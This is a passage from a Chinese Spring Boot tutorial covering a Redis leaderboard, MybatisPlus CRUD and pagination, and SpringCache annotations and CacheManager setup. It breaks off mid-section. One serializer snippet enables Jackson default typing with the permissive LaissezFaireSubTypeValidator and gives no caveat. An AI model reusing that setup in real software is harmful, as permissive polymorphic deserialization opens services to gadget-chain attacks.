UserPointVO p1 = <span class="keyword">new</span> UserPointVO(<span class="string">"老王"</span>,<span class="string">"13113"</span>);</span><br><span class="line">    UserPointVO p2 = <span class="keyword">new</span> UserPointVO(<span class="string">"老A"</span>,<span class="string">"324"</span>);</span><br><span class="line">    UserPointVO p3 = <span class="keyword">new</span> UserPointVO(<span class="string">"老B"</span>,<span class="string">"242"</span>);</span><br><span class="line">    UserPointVO p4 = <span class="keyword">new</span> UserPointVO(<span class="string">"老C"</span>,<span class="string">"542345"</span>);</span><br><span class="line">    UserPointVO p5 = <span class="keyword">new</span> UserPointVO(<span class="string">"老D"</span>,<span class="string">"235"</span>);</span><br><span class="line">    UserPointVO p6 = <span class="keyword">new</span> UserPointVO(<span class="string">"老E"</span>,<span class="string">"1245"</span>);</span><br><span class="line">    UserPointVO p7 = <span class="keyword">new</span> UserPointVO(<span class="string">"老F"</span>,<span class="string">"2356432"</span>);</span><br><span class="line">    UserPointVO p8 = <span class="keyword">new</span> UserPointVO(<span class="string">"老G"</span>,<span class="string">"532332"</span>);</span><br><span class="line">    BoundZSetOperations&lt;String, UserPointVO&gt; operations = redisTemplate.boundZSetOps(<span class="string">"point:rank:real"</span>);</span><br><span class="line">    operations.add(p1,<span class="number">888</span>);</span><br><span class="line">    operations.add(p2,<span class="number">34</span>);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接口开发<ul><li>返回榜单-从大到小排序</li><li>查看这个人的排名，从大到小，0就是第一</li><li>给某个用户加积分</li><li>查看某个用户的积分</li></ul></li></ul><h1 id="SpringBoot2-X-MybatisPlus-SpringCache框架项目实战"><a href="#SpringBoot2-X-MybatisPlus-SpringCache框架项目实战" class="headerlink" title="SpringBoot2.X+MybatisPlus+SpringCache框架项目实战"></a>SpringBoot2.X+MybatisPlus+SpringCache框架项目实战</h1><h2 id="SpringCache缓存框架"><a href="#SpringCache缓存框架" class="headerlink" title="SpringCache缓存框架"></a><strong>SpringCache缓存框架</strong></h2><ul><li>SpringCache简介<ul><li>文档：<a href="https://spring.io/guides/gs/caching/" target="_blank" rel="noopener">https://spring.io/guides/gs/caching/</a></li><li>自Spring 3.1起，提供了类似于@Transactional注解事务的注解Cache支持，且提供了Cache抽象</li><li>提供基本的Cache抽象，方便切换各种底层Cache</li><li>只需要更少的代码就可以完成业务数据的缓存</li><li>提供事务回滚时也自动回滚缓存，支持比较复杂的缓存逻辑</li><li>核心<ul><li>一个是Cache接口，缓存操作的API；</li><li>一个是CacheManager管理各类缓存，有多个缓存框架的实现</li></ul></li></ul></li><li>项目中引入starter</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-cache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>配置文件指定缓存类型</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">redis</span></span><br></pre></td></tr></table></figure><ul><li>启动类开启缓存注解</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@EnableCaching</span></span><br></pre></td></tr></table></figure><h2 id="MybatisPlus连接Mysql数据库"><a href="#MybatisPlus连接Mysql数据库" class="headerlink" title="MybatisPlus连接Mysql数据库"></a><strong>MybatisPlus连接Mysql数据库</strong></h2><ul><li>添加依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--mybatis plus和springboot整合--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--数据库驱动--&gt;</span>           </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>新增配置</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#==============================数据库相关配置========================================</span></span><br><span class="line"><span class="comment">#数据库配置</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/xdclass_user?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">xdclass.net</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置plus打印sql日志</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure><ul><li>数据库和表建立</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`title`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'标题'</span>,</span><br><span class="line">  <span class="string">`cover_img`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'封面图'</span>,</span><br><span class="line">  <span class="string">`detail`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'详情'</span>,</span><br><span class="line">  <span class="string">`amount`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'新价格'</span>,</span><br><span class="line">  <span class="string">`stock`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'库存'</span>,</span><br><span class="line">  <span class="string">`create_time`</span> datetime <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">5</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4;</span><br></pre></td></tr></table></figure><ul><li>插入数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`product`</span> (<span class="string">`id`</span>, <span class="string">`title`</span>, <span class="string">`cover_img`</span>, <span class="string">`detail`</span>, <span class="string">`amount`</span>, <span class="string">`stock`</span>, <span class="string">`create_time`</span>)</span><br><span class="line"><span class="keyword">VALUES</span></span><br><span class="line">  (<span class="number">1</span>, <span class="string">'老王-小滴课堂抱枕'</span>, <span class="string">'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png'</span>, <span class="string">'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg'</span>, <span class="number">213</span>, <span class="number">100</span>, <span class="string">'2021-09-12 00:00:00'</span>),</span><br><span class="line">  (<span class="number">2</span>, <span class="string">'老王-技术人的杯子Linux'</span>, <span class="string">'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png'</span>, <span class="string">'https://file.xdclass.net/video/2021/59-Postman/summary.jpeg'</span>, <span class="number">42</span>, <span class="number">100</span>, <span class="string">'2021-03-12 00:00:00'</span>),</span><br><span class="line">  (<span class="number">3</span>, <span class="string">'技术人的杯子docker'</span>, <span class="string">'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png'</span>, <span class="string">'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg'</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="string">'2022-09-22 00:00:00'</span>),</span><br><span class="line">  (<span class="number">4</span>, <span class="string">'技术人的杯子git'</span>, <span class="string">'https://file.xdclass.net/video/2020/alibabacloud/zt-alibabacloud.png'</span>, <span class="string">'https://file.xdclass.net/video/2021/60-MLS/summary.jpeg'</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="string">'2022-11-12 00:00:00'</span>);</span><br></pre></td></tr></table></figure><ul><li>DO类编写</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@TableName</span>(<span class="string">"product"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProductDO</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableId</span>(value = <span class="string">"id"</span>, type = IdType.AUTO)</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 标题</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 封面图</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String coverImg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 详情</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String detail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新价格</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer amount;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 库存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Integer stock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建时间</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SpringBoot-MybatisPlus开发商品列表的CRUD接口"><a href="#SpringBoot-MybatisPlus开发商品列表的CRUD接口" class="headerlink" title="SpringBoot+MybatisPlus开发商品列表的CRUD接口"></a>SpringBoot+MybatisPlus开发商品列表的CRUD接口</h2><ul><li>编写Service</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">save</span><span class="params">(ProductDO productDO)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> productMapper.insert(productDO);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> productMapper.deleteById(id);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateById</span><span class="params">(ProductDO productDO)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> productMapper.updateById(productDO);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ProductDO <span class="title">findById</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> productMapper.selectById(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编写controller</li></ul><h2 id="开发商品分页接口"><a href="#开发商品分页接口" class="headerlink" title="开发商品分页接口"></a>开发商品分页接口</h2><ul><li>为啥要开发分页接口？<ul><li>很多人不知道分页怎么缓存</li></ul></li><li>MybatisPlus分页接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">page</span><span class="params">(<span class="keyword">int</span> page, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Page&lt;ProductDO&gt; pageInfo = <span class="keyword">new</span> Page&lt;&gt;(page, size);</span><br><span class="line"></span><br><span class="line">    IPage&lt;ProductDO&gt; productDOIPage = productMapper.selectPage(pageInfo, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Object&gt; pageMap = <span class="keyword">new</span> HashMap&lt;&gt;(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    pageMap.put(<span class="string">"total_record"</span>, productDOIPage.getTotal());</span><br><span class="line">    pageMap.put(<span class="string">"total_page"</span>, productDOIPage.getPages());</span><br><span class="line">    pageMap.put(<span class="string">"current_data"</span>, productDOIPage.getRecords());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pageMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>controller编写</li><li>分页插件配置</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新的分页插件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MybatisPlusInterceptor <span class="title">mybatisPlusInterceptor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MybatisPlusInterceptor interceptor = <span class="keyword">new</span> MybatisPlusInterceptor();</span><br><span class="line">    interceptor.addInnerInterceptor(<span class="keyword">new</span> PaginationInnerInterceptor(DbType.MYSQL));</span><br><span class="line">    <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="SpringCache常用注解介绍"><a href="#SpringCache常用注解介绍" class="headerlink" title="SpringCache常用注解介绍"></a>SpringCache常用注解介绍</h1><h2 id="SpringCache框架常用之Cacheable实战"><a href="#SpringCache框架常用之Cacheable实战" class="headerlink" title="SpringCache框架常用之Cacheable实战"></a>SpringCache框架常用之Cacheable实战</h2><ul><li>Cacheable注解<ul><li>标记在一个方法上，也可以标记在一个类上</li><li>缓存标注对象的返回结果，标注在方法上缓存该方法的返回值，标注在类上缓存该类所有的方法返回值</li><li>value 缓存名称，可以有多个</li><li>key 缓存的key规则，可以用springEL表达式，默认是方法参数组合</li><li>condition 缓存条件，使用springEL编写，返回true才缓存</li></ul></li><li>案例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对象</span></span><br><span class="line"><span class="meta">@Cacheable</span>(value = &#123;<span class="string">"product"</span>&#125;, key=<span class="string">"#root.methodName"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//分页</span></span><br><span class="line"><span class="meta">@Cacheable</span>(value = &#123;<span class="string">"product_page"</span>&#125;,key=<span class="string">"#root.methodName + #page+'_'+#size"</span>)</span><br></pre></td></tr></table></figure><ul><li>spEL表达式<ul><li>methodName 当前被调用的方法名<ul><li>root.methodname</li></ul></li><li>args 当前被调用的方法的参数列表<ul><li>root.args[0]</li></ul></li><li>result 方法执行后的返回值<ul><li>result</li></ul></li></ul></li></ul><h2 id="SpringCache框架自定义CacheManager配置和过期时间"><a href="#SpringCache框架自定义CacheManager配置和过期时间" class="headerlink" title="SpringCache框架自定义CacheManager配置和过期时间"></a>SpringCache框架自定义CacheManager配置和过期时间</h2><ul><li>修改redis缓存序列化器和配置manager过期时间</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@Primary</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RedisCacheManager <span class="title">cacheManager1Hour</span><span class="params">(RedisConnectionFactory connectionFactory)</span> </span>&#123;</span><br><span class="line">    RedisCacheConfiguration config = instanceConfig(<span class="number">3600L</span>);</span><br><span class="line">    <span class="keyword">return</span> RedisCacheManager.builder(connectionFactory)</span><br><span class="line">        .cacheDefaults(config)</span><br><span class="line">        .transactionAware()</span><br><span class="line">        .build();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> RedisCacheManager <span class="title">cacheManager1Day</span><span class="params">(RedisConnectionFactory connectionFactory)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    RedisCacheConfiguration config = instanceConfig(<span class="number">3600</span> * <span class="number">24L</span>);</span><br><span class="line">    <span class="keyword">return</span> RedisCacheManager.builder(connectionFactory)</span><br><span class="line">        .cacheDefaults(config)</span><br><span class="line">        .transactionAware()</span><br><span class="line">        .build();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> RedisCacheConfiguration <span class="title">instanceConfig</span><span class="params">(Long ttl)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    Jackson2JsonRedisSerializer&lt;Object&gt; jackson2JsonRedisSerializer = <span class="keyword">new</span> Jackson2JsonRedisSerializer&lt;&gt;(Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">    objectMapper.disable(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS);</span><br><span class="line">    objectMapper.registerModule(<span class="keyword">new</span> JavaTimeModule());</span><br><span class="line">    <span class="comment">// 去掉各种@JsonSerialize注解的解析</span></span><br><span class="line">    objectMapper.configure(MapperFeature.USE_ANNOTATIONS, <span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// 只针对非空的值进行序列化</span></span><br><span class="line">    objectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);</span><br><span class="line">    <span class="comment">// 将类型序列化到属性json字符串中</span></span><br><span class="line">    objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance ,</span><br><span class="line">                                       ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line"></span><br><span class="line">    jackson2JsonRedisSerializer.setObjectMapper(objectMapper);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> RedisCacheConfiguration.defaultCacheConfig()</span><br><span class="line">        .entryTtl(Duration.ofSeconds(ttl))</span><br><span class="line">        .disableCachingNullValues()</span><br><span class="line">        .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SpringCache框架自定义缓存KeyGenerator"><a href="#SpringCache框架自定义缓存KeyGenerator" class="headerlink" title="SpringCache框架自定义缓存KeyGenerator"></a>SpringCache框架自定义缓存KeyGenerator</h2><ul><li>Key规则定义麻烦，支持自定规则</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> KeyGenerator <span class="title">springCacheDefaultKeyGenerator</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> KeyGenerator() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">generate</span><span class="params">(Object o, Method method, Object... objects)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> o.getClass().getSimpleName() + <span class="string">"_"</span></span><br><span class="line">                + method.getName() + <span class="string">"_"</span></span><br><span class="line">                + StringUtils.arrayToDelimitedString(objects, <span class="string">"_"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用</li><li>key 属性和keyGenerator属性只能二选一</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Cacheable</span>(value = &#123;<span class="string">"product"</span>&#125;,keyGenerator = <span class="string">"springCacheCustomKeyGenerator"</span>, cacheManager = <span class="string">"cacheManager1Minute"</span>)</span><br></pre></td></tr></table></figure><h2 id="SpringCache框架常用之CacheEvict实战"><a href="#SpringCache框架常用之CacheEvict实战" class="headerlink" title="SpringCache框架常用之CacheEvict实战"></a>SpringCache框架常用之CacheEvict实战</h2><ul><li>CacheEvict<ul><li>从缓存中移除相应数据, 触发缓存删除的操作</li><li>value 缓存名称，可以有多个</li><li>key 缓存的key规则，可以用springEL表达式，默认是方法参数组合</li><li>beforeInvocation = false<ul><li>缓存的清除是否在方法之前执行 ,默认代表缓存清除操作是在方法执行之后执行;</li><li>如果出现异常缓存就不会清除</li></ul></li><li>beforeInvocation = true<ul><li>代表清除缓存操作是在方法运行之前执行，无论方法是否出现异常，缓存都清除</li></ul></li></ul></li><li>案例实战</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CacheEvict</span>(value = &#123;<span class="string">"product"</span>&#125;,key = <span class="string">"#root.args[0]"</span>)</span><br></pre></td></tr></table></figure><h2 id="SpringCache框架常用之多注解组合Caching实战"><a href="#SpringCache框架常用之多注解组合Caching实战" class="headerlink" title="SpringCache框架常用之多注解组合Caching实战"></a>SpringCache框架常用之多注解组合Caching实战</h2><ul><li><p>Caching</p><ul><li>组合多个Cache注解使用</li><li>允许在同一方法上使用多个嵌套的@Cacheable、@CachePut和@CacheEvict注释</li></ul></li><li><p>实战</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Caching</span>(</span><br><span class="line">    cacheable = &#123;</span><br><span class="line">        <span class="meta">@Cacheable</span>(value = <span class="string">"product"</span>,keyGenerator = <span class="string">"springCacheCustomKeyGenerator"</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    put = &#123;</span><br><span class="line">        <span class="meta">@CachePut</span>(value = <span class="string">"product"</span>,key = <span class="string">"#id"</span>),</span><br><span class="line">        <span class="meta">@CachePut</span>(value = <span class="string">"product"</span>,key = <span class="string">"'stock:'+#id"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="分布式缓存面试题-SpringCache解决方案"><a href="#分布式缓存面试题-SpringCache解决方案" class="headerlink" title="分布式缓存面试题+SpringCache解决方案"></a>分布式缓存面试题+SpringCache解决方案</h1><h2 id="分布式缓存必考题之缓存击穿-解决方案"><a href="#分布式缓存必考题之缓存击穿-解决方案" class="headerlink" title="分布式缓存必考题之缓存击穿+解决方案"></a><strong>分布式缓存必考题之缓存击穿+解决方案</strong></h2><ul><li><p>缓存击穿 